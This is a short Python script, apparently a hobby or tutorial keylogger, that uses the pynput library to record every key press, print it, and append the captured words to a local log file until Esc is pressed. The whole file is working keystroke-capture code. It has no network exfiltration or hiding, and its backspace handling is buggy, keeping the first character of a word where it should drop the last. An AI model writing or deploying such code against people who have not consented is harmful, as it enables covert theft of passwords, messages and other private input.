from pynput.keyboard import Key, Listener

word = ''
full_log = ''
chars_limit = 20

def keylogger(key):
    global word
    global full_log
    global chars_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''

        if len(full_log) >= chars_limit:
            print(full_log)

            with open('log_file.txt', 'a+') as file:
                file.write(full_log)

            full_log = ''

    elif key == Key.backspace:
        word = word[:1]

    elif key == Key.shift_l or key == Key.shift_r:
        return
    else:
        char = f'{key}'
        char = char[1:-1]
        print(char)
        word += char

    if key == Key.esc:
        return False


def main():
    with Listener(on_press=keylogger) as log:
        log.join()

if __name__ == '__main__':
    main()